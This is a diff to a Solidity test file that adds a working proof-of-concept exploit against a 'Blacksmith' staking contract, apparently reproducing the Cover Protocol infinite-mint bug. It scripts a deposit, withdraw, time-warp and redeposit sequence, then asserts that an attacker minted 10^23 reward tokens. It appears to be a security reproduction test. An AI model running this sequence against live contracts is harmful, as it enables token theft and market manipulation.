@@ -11,6 +11,21 @@ interface Hevm {
     function warp(uint256) external;
 }
 
+contract Guy {
+    function approve(DSToken token, address addr) external {
+        token.approve(addr);
+    }
+    function deposit(Blacksmith bs, address lpToken, uint256 amount) external {
+        bs.deposit(lpToken, amount);
+    }
+    function withdraw(Blacksmith bs, address lpToken, uint256 amount) external {
+        bs.withdraw(lpToken, amount);
+    }
+    function claimRewards(Blacksmith bs, address lpToken) external {
+        bs.claimRewards(lpToken);
+    }
+}
+
 contract DhCover20201228Test is DSTest {
 
     // CHEAT_CODE = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D
@@ -35,8 +50,34 @@ contract DhCover20201228Test is DSTest {
 
         lpToken = new DSToken("LPTOKEN");
         blacksmith.addPool(address(lpToken), 100);
+
+        // nice round number for weekly rewards (100 per day)
+        blacksmith.updateWeeklyTotal(700 * 10**18);
     }
 
     function test_exploit() public {
+        Guy ali = new Guy();
+        Guy bob = new Guy();
+
+        uint256 AMT = 1000 * 10**18;
+        lpToken.mint(address(ali), AMT);
+        lpToken.mint(address(bob), AMT);
+
+        ali.approve(lpToken, address(blacksmith));
+        bob.approve(lpToken, address(blacksmith));
+
+        ali.deposit(blacksmith, address(lpToken), AMT);
+        bob.deposit(blacksmith, address(lpToken), AMT);
+        bob.withdraw(blacksmith, address(lpToken), AMT - 1);
+        ali.withdraw(blacksmith, address(lpToken), AMT);
+        hevm.warp(block.timestamp + 1 days);
+        bob.deposit(blacksmith, address(lpToken), AMT - 1);
+        bob.claimRewards(blacksmith, address(lpToken));
+
+        // Bob minted 10*23 COVER
+        assertEq(coverToken.balanceOf(address(bob)), (10**23) * (1 ether));
+
+        // This exceeds the "intended" daily maximum mint.
+        assertGt(coverToken.balanceOf(address(bob)), blacksmith.weeklyTotal() / 7);
     }
 }
